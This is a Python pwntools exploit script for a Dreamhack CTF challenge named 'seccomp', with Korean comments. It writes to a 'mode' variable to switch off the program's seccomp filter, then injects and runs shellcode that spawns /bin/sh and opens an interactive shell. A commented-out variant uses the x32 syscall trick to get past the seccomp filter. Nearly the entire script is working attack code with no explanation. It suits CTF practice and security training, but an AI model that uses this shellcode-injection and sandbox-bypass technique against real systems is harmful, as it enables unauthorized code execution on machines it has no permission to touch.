#!/usr/bin/python
# coding=utf-8
from pwn import *
import sys

context.arch = 'x86_64'
context.log_level='debug'

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',22463)
elif sys.argv[1]=="-l":
    p = process('seccomp')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('./seccomp')

# Addersses
mode_addr=e.symbols['mode']

log.info("mode address: {}".format(hex(mode_addr)))
shellcode=asm(shellcraft.amd64.linux.sh())
# 3 -> mode를 FILTER로
# 1 -> SHELLCODE 작성
# 2 -> SHELLCODE 실행

#shellcode="""
#        push 0x68
#        mov rax, 0x732f2f2f6e69622f
#        push rax
#        mov rdi, rsp
#        xor esi, esi 
#        xor edx, edx
#        mov eax, 0x40000000
#        or eax, 0x39
#        syscall
#"""
#shellcode=asm(shellcode)

p.sendlineafter("> ","3")
p.sendlineafter("addr: ",str(mode_addr))
p.sendlineafter("value: ",str(2))


p.sendlineafter("> ","1")
p.sendlineafter("shellcode: ",shellcode)

p.sendlineafter("> ","2")

p.interactive()